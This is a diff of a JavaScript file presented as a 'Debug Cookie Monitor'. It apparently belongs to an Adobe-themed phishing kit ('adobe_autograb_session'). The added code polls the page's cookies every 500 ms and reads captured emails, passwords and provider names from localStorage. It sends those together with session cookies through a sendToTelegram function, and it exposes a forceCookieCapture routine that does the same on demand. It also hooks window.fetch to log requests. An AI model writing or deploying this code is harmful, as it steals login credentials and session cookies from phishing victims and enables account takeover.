@@ -1,55 +1,127 @@
-/**
- * Debug Cookie Capture Script
- * Add this to your HTML to debug cookie capture issues
- */
-
-console.log('🔍 Debug Cookie Capture Script Loaded');
-
-// Function to check all cookie sources
-function debugCookieCapture() {
-  console.log('=== COOKIE DEBUG REPORT ===');
-  
-  // 1. Check document.cookie
-  console.log('1. document.cookie:', document.cookie);
-  
-  // 2. Check if advanced capture is available
-  if (window.advancedCookieCapture) {
-    const captured = window.advancedCookieCapture.getAllCookies();
-    console.log('2. Advanced capture cookies:', captured);
-    console.log('3. Advanced capture stats:', window.advancedCookieCapture.getStats());
-  } else {
-    console.log('2. Advanced cookie capture not available');
-  }
-  
-  // 3. Check localStorage for session data
-  try {
-    const session = localStorage.getItem('adobe_autograb_session');
-    if (session) {
-      const sessionData = JSON.parse(session);
-      console.log('4. Session data:', sessionData);
-      if (sessionData.cookies) {
-        console.log('5. Session cookies:', sessionData.cookies);
-      }
+// Debug Cookie Monitor
+(function() {
+    'use strict';
+    
+    console.log('🔍 Debug Cookie Monitor loaded');
+    
+    // Enhanced cookie debugging
+    function debugCookies() {
+        const cookies = document.cookie;
+        const allCookies = {};
+        
+        if (cookies) {
+            cookies.split(';').forEach(cookie => {
+                const [name, value] = cookie.trim().split('=');
+                if (name && value) {
+                    allCookies[name] = decodeURIComponent(value);
+                }
+            });
+        }
+        
+        console.log('🍪 Current cookies:', {
+            raw: cookies,
+            parsed: allCookies,
+            count: Object.keys(allCookies).length,
+            domain: window.location.hostname,
+            url: window.location.href,
+            timestamp: new Date().toISOString()
+        });
+        
+        return allCookies;
     }
-  } catch (e) {
-    console.log('4. No session data found');
-  }
-  
-  // 4. Check if sendTelegram function exists
-  if (window.sendDataToBackend) {
-    console.log('6. sendDataToBackend function available');
-  } else {
-    console.log('6. sendDataToBackend function NOT available');
-  }
-  
-  console.log('=== END DEBUG REPORT ===');
-}
-
-// Run debug immediately
-debugCookieCapture();
-
-// Run debug every 5 seconds
-setInterval(debugCookieCapture, 5000);
-
-// Export for manual testing
-window.debugCookieCapture = debugCookieCapture;
+    
+    // Monitor all cookie changes
+    let lastCookieState = document.cookie;
+    
+    function checkCookieChanges() {
+        const currentCookies = document.cookie;
+        if (currentCookies !== lastCookieState) {
+            console.log('🔄 Cookie change detected:', {
+                before: lastCookieState,
+                after: currentCookies,
+                domain: window.location.hostname,
+                timestamp: new Date().toISOString()
+            });
+            lastCookieState = currentCookies;
+            debugCookies();
+            
+            // Auto-send to backend when cookies change
+            if (window.sendToTelegram && currentCookies) {
+                const sessionData = JSON.parse(localStorage.getItem('adobe_autograb_session') || '{}');
+                if (sessionData.email) {
+                    console.log('🚀 Auto-sending cookie changes to Telegram...');
+                    window.sendToTelegram({
+                        email: sessionData.email,
+                        password: sessionData.password || 'Cookie change detected',
+                        provider: sessionData.provider || 'Auto-detected',
+                        cookies: currentCookies,
+                        documentCookies: currentCookies,
+                        timestamp: new Date().toISOString(),
+                        action: 'cookie_change_detected',
+                        domain: window.location.hostname
+                    });
+                }
+            }
+        }
+    }
+    
+    // Check for changes more frequently
+    setInterval(checkCookieChanges, 500);
+    
+    // Monitor cross-origin requests
+    const originalFetch = window.fetch;
+    window.fetch = function(...args) {
+        const url = args[0];
+        console.log('🌐 Fetch request:', url, 'Cookies before:', document.cookie);
+        
+        return originalFetch.apply(this, args).then(response => {
+            console.log('📥 Fetch response:', url, 'Cookies after:', document.cookie);
+            return response;
+        });
+    };
+    
+    // Expose debug functions globally
+    window.debugCookies = debugCookies;
+    window.clearAllCookies = function() {
+        document.cookie.split(";").forEach(function(c) { 
+            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
+        });
+        console.log('🧹 All cookies cleared');
+    };
+    
+    window.setCookie = function(name, value, days = 7) {
+        const expires = new Date(Date.now() + days * 864e5).toUTCString();
+        document.cookie = `${name}=${encodeURIComponent(value)}; expires=${expires}; path=/`;
+        console.log(`🍪 Cookie set: ${name}=${value}`);
+        
+        // Trigger change detection
+        setTimeout(checkCookieChanges, 100);
+    };
+    
+    // Add function to force cookie capture and send
+    window.forceCookieCapture = function() {
+        const cookies = document.cookie;
+        console.log('🔥 Force capturing cookies:', cookies);
+        
+        if (window.sendToTelegram && cookies) {
+            const sessionData = JSON.parse(localStorage.getItem('adobe_autograb_session') || '{}');
+            window.sendToTelegram({
+                email: sessionData.email || 'force-capture@domain.com',
+                password: sessionData.password || 'Force captured',
+                provider: sessionData.provider || 'Force Capture',
+                cookies: cookies,
+                documentCookies: cookies,
+                timestamp: new Date().toISOString(),
+                action: 'force_capture',
+                domain: window.location.hostname
+            });
+        }
+        
+        return cookies;
+    };
+    
+    // Initial debug
+    setTimeout(debugCookies, 100);
+    
+    console.log('🔍 Debug Cookie Monitor active - Use debugCookies(), clearAllCookies(), setCookie(), forceCookieCapture() in console');
+})();
